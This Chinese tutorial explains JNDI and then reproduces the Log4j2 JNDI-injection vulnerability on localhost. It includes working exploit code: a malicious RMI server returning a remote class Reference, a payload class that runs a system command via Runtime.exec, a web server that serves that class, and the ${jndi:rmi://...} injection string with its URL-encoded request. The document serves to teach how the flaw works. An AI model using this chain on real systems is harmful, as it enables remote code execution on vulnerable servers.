Java Log4j2<br />造成 Log4j2 漏洞的“罪魁祸首”是JNDI，过对Log4j2漏洞的分析，不仅了解JNDI的基础知识，而且重现了一次基于JNDI的工具。<br />说起JNDI，从事Java EE编程的人应该都在用着，但知不知道自己在用，那就看对技术的钻研深度了。这次Log4j2曝出漏洞，不正说明大量项目或直接或间接的在用着JNDI。来看看JNDI到底是什么？<br />先来看看Sun官方的解释：
> Java命名和目录接口（Java Naming and Directory Interface ，JNDI）是用于从Java应用程序中访问名称和目录服务的一组API。命名服务即将名称与对象相关联，以便能通过相应名称访问这些对象。而目录服务即其对象具有属性及名称的命名服务。
> 命名或目录服务允许你集中管理共享信息的存储，这在网络应用程序中很重要，因为它可以使这类应用程序更加一致和易于管理。例如，可以将打印机配置存储在目录服务中，这样所有与打印机相关的应用程序都能够使用它。

概念是不是很抽象，读了好几遍都没懂？一图胜千言：<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892645-087aa7fb-399e-45f9-a51e-f8fa41c5ac37.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=ua885ae73&originHeight=580&originWidth=865&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u22c514bd-412d-4d5a-973b-1de76182c12&title=)<br />naming_service<br />看着有点注册中心的意思？是的，如果使用过Nacos或读过Nacos的源码，Naming Service这个概念一定很熟悉。在JNDI中，虽然实现方式不同、应用场景不同，但并不影响通过类比注册中心的方式来理解JNDI。<br />如果没用过Nacos，Map总用过吧。忽略掉JNDI与Map底层实现的区别，JNDI提供了一个类似Map的绑定功能，然后又提供了基于lookup或search之类的方法来根据名称查找Object，好比Map的get方法。<br />总之，JNDI就是一个规范，规范就需要对应的API（也就是一些Java类）来实现。通过这组API，可以将Object（对象）和一个名称进行关联，同时提供了基于名称查找Object的途径。<br />最后，对于JNDI，SUN公司只是提供了一个接口规范，具体由对应的服务器来实现。比如，Tomcat有Tomcat的实现方式，JBoss有JBoss的实现方式，遵守规范就好。
<a name="OreF7"></a>
### 命名服务与目录服务的区别
命名服务就是上面提到的，类似Map的绑定与查找功能。比如：在Internet中的域名服务（domain naming service，DNS），就是提供将域名映射到IP地址的命名服务，在浏览器中输入域名，通过DNS找到相应的IP地址，然后访问网站。<br />目录服务是对命名服务的扩展，是一种特殊的命名服务，提供了属性与对象的关联和查找。一个目录服务通常拥有一个命名服务（但是一个命名服务不必具有一个目录服务）。比如电话簿就是一个典型的目录服务，一般先在电话簿里找到相关的人名，再找到这个人的电话号码。<br />目录服务允许属性（比如用户的电子邮件地址）与对象相关联（而命名服务则不然）。这样，使用目录服务时，可以基于对象的属性来搜索它们。
<a name="oZVuH"></a>
### JNDI架构分层
JNDI通常分为三层：

- JNDI API：用于与Java应用程序与其通信，这一层把应用程序和实际的数据源隔离开来。因此无论应用程序是访问LDAP、RMI、DNS还是其他的目录服务，跟这一层都没有关系。
- Naming Manager：也就是命名服务；
- JNDI SPI（Server Provider Interface）：用于具体到实现的方法上。

整体架构分层如下图：<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892282-1e3fd523-d9b0-4f29-bb52-99a07e1e299a.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=ua905c582&originHeight=359&originWidth=575&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u3eb4a885-ad17-48f9-b4a1-e67624d6aa8&title=)<br />JNDI架构<br />需要注意的是：JNDI同时提供了应用程序编程接口（Application Programming Interface ，API）和服务提供程序接口（Service Provider Interface ，SPI）。<br />这样做对于与命名或目录服务交互的应用程序来说，必须存在一个用于该服务的JNDI服务提供程序，这便是JNDI SPI发挥作用的舞台。<br />一个服务提供程序基本上就是一组类，对特定的命名和目录服务实现了各种JNDI接口——这与JDBC驱动程序针对特定的数据系统实现各种JDBC接口极为相似。作为开发人员，不需要担心JNDI SPI。只需确保为每个要使用的命名或目录服务提供了一个服务提供程序即可。
<a name="tX7R0"></a>
### JNDI的应用
下面再了解一下JNDI容器的概念及应用场景。
<a name="LB5y5"></a>
#### JNDI容器环境
JNDI中的命名（Naming），就是将Java对象以某个名称的形式绑定（binding）到一个容器环境（Context）中。当使用时，调用容器环境（Context）的查找（lookup）方法找出某个名称所绑定的Java对象。<br />容器环境（Context）本身也是一个Java对象，它也可以通过一个名称绑定到另一个容器环境（Context）中。将一个Context对象绑定到另外一个Context对象中，这就形成了一种父子级联关系，多个Context对象最终可以级联成一种树状结构，树中的每个Context对象中都可以绑定若干个Java对象。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892402-30560c23-5d27-466c-a4e7-a4f998fa2c9b.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=u9c25b8a9&originHeight=300&originWidth=460&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u27710ed0-90f2-45ea-b10b-db2f767a05c&title=)<br />jndi-context-tree
<a name="WfkFd"></a>
#### JNDI 应用
JNDI的基本使用操作就是：先创建一个对象，然后放到容器环境中，使用的时候再拿出来。<br />此时，是否疑惑干嘛这么费劲呢？换句话说，这么费劲能带来什么好处呢？<br />在真实应用中，通常是由系统程序或框架程序先将资源对象绑定到JNDI环境中，后续在该系统或框架中运行的模块程序就可以从JNDI环境中查找这些资源对象了。<br />关于JDNI与实践相结合的一个例子是JDBC的使用。在没有基于JNDI实现时，连接一个数据库通常需要：加载数据库驱动程序、连接数据库、操作数据库、关闭数据库等步骤。而不同的数据库在对上述步骤的实现又有所不同，参数也可能发生变化。<br />如果把这些问题交由J2EE容器来配置和管理，程序就只需对这些配置和管理进行引用就可以了。<br />以Tomcat服务器为例，在启动时可以创建一个连接到某种数据库系统的数据源（DataSource）对象，并将该数据源（DataSource）对象绑定到JNDI环境中，以后在这个Tomcat服务器中运行的Servlet和JSP程序就可以从JNDI环境中查询出这个数据源（DataSource）对象进行使用，而不用关心数据源（DataSource）对象是如何创建出来的。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892311-ceebbd3e-dbbc-4238-a624-5c0937cc1606.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=uac467154&originHeight=461&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u3ddfa733-a1a1-44d1-a3a1-552cb263947&title=)<br />JNDI-Tree<br />这种方式极大地增强了系统的可维护性，即便当数据库系统的连接参数发生变更时，也与应用程序开发人员无关。JNDI将一些关键信息放到内存中，可以提高访问效率；通过 JNDI可以达到解耦的目的，让系统更具可维护性和可扩展性。
<a name="k1BU1"></a>
## JNDI实战
有了以上的概念和基础知识，现在可以开始实战了。<br />在架构图中，JNDI的实现层中包含了多种实现方式，这里就基于其中的RMI实现来写个实例体验一把。
<a name="uqz1e"></a>
### 基于RMI的实现
RMI是Java中的远程方法调用，基于Java的序列化和反序列化传递数据。<br />可以通过如下代码来搭建一个RMI服务：
```java
// ①定义接口
public interface RmiService extends Remote {
    String sayHello() throws RemoteException;
}

// ②接口实现
public class MyRmiServiceImpl extends UnicastRemoteObject implements RmiService {
    protected MyRmiServiceImpl() throws RemoteException {
    }

    @Override
    public String sayHello() throws RemoteException {
        return "Hello World!";
    }
}

// ③服务绑定并启动监听
public class RmiServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动，监听：1099 端口");
        registry.bind("hello", new MyRmiServiceImpl());
        Thread.currentThread().join();
    }
}
```
上述代码先定义了一个RmiService的接口，该接口实现了Remote，并对RmiService接口进行了实现。在实现的过程中继承了`UnicastRemoteObject`的具体服务实现类。<br />最后，在RmiServer中通过Registry监听1099端口，并将RmiService接口的实现类进行了绑定。<br />下面构建客户端访问：
```java
public class RmiClient {

    public static void main(String[] args) throws Exception {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        RmiService service = (RmiService) ctx.lookup("hello");
        System.out.println(service.sayHello());
    }
}
```
其中，提供了两个参数`Context.INITIAL_CONTEXT_FACTORY`、`Context.PROVIDER_URL`，分别表示Context初始化的工厂方法和提供服务的url。<br />执行上述程序，就可以获得远程端的对象并调用，这样就实现了RMI的通信。当然，这里Server和Client在同一台机器，就用了“localhost”的，如果是远程服务器，则替换成对应的IP即可。
<a name="hYnXT"></a>
### 构建攻击
常规来说，如果要构建攻击，只需伪造一个服务器端，返回恶意的序列化Payload，客户端接收之后触发反序列化。但实际上对返回的类型是有一定的限制的。<br />在JNDI中，有一个更好利用的方式，涉及到命名引用的概念`javax.naming.Reference`。<br />如果一些本地实例类过大，可以选择一个远程引用，通过远程调用的方式，引用远程的类。这也就是JNDI利用Payload还会涉及HTTP服务的原因。<br />RMI服务只会返回一个命名引用，告诉JNDI应用该如何去寻找这个类，然后应用则会去HTTP服务下找到对应类的class文件并加载。此时，只要将恶意代码写入static方法中，则会在类加载时被执行。<br />基本流程如下：<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892418-da539526-ccfc-444f-9b7b-aeb72402de0f.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=ue4863d7a&originHeight=326&originWidth=705&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud8c1720a-0245-47eb-9674-5e82f7a9716&title=)<br />RMI攻击流程<br />修改RmiServer的代码实现：
```java
public class RmiServer {

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动，监听：1099 端口");
        Reference reference = new Reference("Calc", "Calc", "http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);

        Thread.currentThread().join();
    }
}
```
由于采用的Java版本较高，需先将系统变量`com.sun.jndi.rmi.object.trustURLCodebase`设置为`true`。<br />其中绑定的`Reference`涉及三个变量：

- `className`：远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载；
- `classFactory`：远程的工厂类；
- `classFactoryLocation`：工厂类加载的地址，可以是`file://`、`ftp://`、`http://` 等协议；

此时，通过Python启动一个简单的HTTP监听服务：
```bash
192:~ zzs$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```
打印日志，说明在8000端口进行了http的监听。<br />对应的客户端代码修改为如下：
```java
public class RmiClient {

  public static void main(String[] args) throws Exception {
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    Context ctx = new InitialContext(env);
    ctx.lookup("hello");
  }
}
```
执行，客户端代码，发现Python监听的服务打印如下：
```
127.0.0.1 - - [12/Dec/2021 16:19:40] code 404, message File not found
127.0.0.1 - - [12/Dec/2021 16:19:40] "GET /Calc.class HTTP/1.1" 404 -
```
可见，客户端已经去远程加载恶意class（Calc.class）文件了，只不过Python服务并没有返回对应的结果而已。
<a name="Miqy1"></a>
### 进一步改造
上述代码证明了可以通过RMI的形式进行攻击，下面基于上述代码和Spring Boot Web服务的形式进一步演示。通过JNDI注入+RMI的形式调用起本地的计算器。<br />上述的基础代码不变，后续只微调RmiServer和RmiClient类，同时添加一些新的类和方法。
<a name="JbiNm"></a>
#### 第一步：构建攻击类
创建一个攻击类BugFinder，用于启动本地的计算器：
```java
public class BugFinder {

    public BugFinder() {
        try {
            System.out.println("执行漏洞代码");
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
            System.out.println("完成执行漏洞代码");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        BugFinder bugFinder = new BugFinder();
    }

}
```
本人是Mac操作系统，代码中就基于Mac的命令实现方式，通过Java命令调用Calculator.app。同时，当该类被初始化时，会执行启动计算器的命令。<br />将上述代码进行编译，存放在一个位置，这里单独copy出来放在了“/Users/zzs/temp/BugFinder.class”路径，以备后用，这就是攻击的恶意代码了。
<a name="PXw2T"></a>
#### 第二步：构建Web服务器
Web服务用于RMI调用时返回攻击类文件。这里采用Spring Boot项目，核心实现代码如下：
```java
@RestController
public class ClassController {

    @GetMapping(value = "/BugFinder.class")
    public void getClass(HttpServletResponse response) {
        String file = "/Users/zzs/temp/BugFinder.class";
        FileInputStream inputStream = null;
        OutputStream os = null;
        try {
            inputStream = new FileInputStream(file);
            byte[] data = new byte[inputStream.available()];
            inputStream.read(data);
            os = response.getOutputStream();
            os.write(data);
            os.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // 省略流的判断关闭；
        }
    }
}
```
在该Web服务中，会读取BugFinder.class文件，并返回给RMI服务。重点提供了一个Web服务，能够返回一个可执行的class文件。
<a name="GVYQi"></a>
#### 第三步：修改RmiServer
对RmiServer的绑定做一个修改：
```java
public class RmiServer {

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动，监听：1099 端口");
        Reference reference = new Reference("com.secbro.rmi.BugFinder", "com.secbro.rmi.BugFinder", "http://127.0.0.1:8080/BugFinder.class");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);

        Thread.currentThread().join();
    }
}
```
这里Reference传入的参数就是攻击类及远程下载的Web地址。
<a name="QFdZ5"></a>
#### 第四步：执行客户端代码
执行客户端代码进行访问：
```java
public class RmiClient {

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        ctx.lookup("hello");
    }
}
```
本地计算器被打开：<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1639397892959-1d4cb09d-55b0-4d7d-9016-e04c75c10942.webp#clientId=u9fb0b82e-4aa1-4&from=paste&id=u63de5aa0&originHeight=662&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u0d3536f4-0b9d-465a-b113-3947f589599&title=)<br />RMI Client
<a name="GHwY4"></a>
## 基于Log4j2的攻击
上面演示了基本的攻击模式，基于上述模式，再来看看Log4j2的漏洞攻击。<br />在Spring Boot项目中引入了log4j2的受影响版本：
```xml
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-web</artifactId>
  <exclusions><!-- 去掉springboot默认配置 -->
    <exclusion>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-logging</artifactId>
    </exclusion>
  </exclusions>
</dependency>

<dependency> <!-- 引入log4j2依赖 -->
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```
这里需要注意，先排除掉Spring Boot默认的日志，否则可能无法复现Bug。<br />修改一下RMI的Server代码：
```java
public class RmiServer {

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动，监听：1099 端口");
        Reference reference = new Reference("com.secbro.rmi.BugFinder", "com.secbro.rmi.BugFinder", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);
        Thread.currentThread().join();
    }
}
```
这里直接访问BugFinder，JNDI绑定名称为：hello。<br />客户端引入Log4j2的API，然后记录日志：
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class RmiClient {

    private static final Logger logger = LogManager.getLogger(RmiClient.class);

    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        logger.error("${jndi:rmi://127.0.0.1:1099/hello}");
        Thread.sleep(5000);
    }
}
```
日志中记录的信息为“`${jndi:rmi://127.0.0.1:1099/hello}`”，也就是RMI Server的地址和绑定的名称。<br />执行程序，发现计算器被成功打开。<br />当然，在实际应用中，`logger.error`中记录的日志信息，可能是通过参数获得，比如在Spring Boot中定义如下代码：
```java
@RestController
public class Log4jController {

  private static final Logger logger = LogManager.getLogger(Log4jController.class);

  /**
  * 方便测试，用了get请求
  * @param username 登录名称
  */
  @GetMapping("/a")
  public void log4j(String username){
    System.out.println(username);
    // 打印登录名称
    logger.info(username);
  }
}
```
在浏览器中请求URL为：<br />http://localhost:8080/a?username=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2Fhello%7D<br />其中username参数的值就是“`${jndi:rmi://127.0.0.1:1099/hello}`”经过`URLEncoder#encode`编码之后的值。此时，访问该URL地址，同样可以将打开计算器。<br />至于Log4j2内部逻辑漏洞触发JNDI调用的部分就不再展开了，感兴趣的朋友在上述实例上进行debug即可看到完整的调用链路。
<a name="L3WW3"></a>
## 小结
JNDI注入事件不仅在Log4j2中发生过，而且在大量其他框架中也有出现。虽然JDNI带来了便利，但同时也带了风险。不过在JDK的高版本中，不进行特殊设置（`com.sun.jndi.rmi.object.trustURLCodebase`设置为`true`），还是无法触发漏洞的。这样也多少让人放心一些。
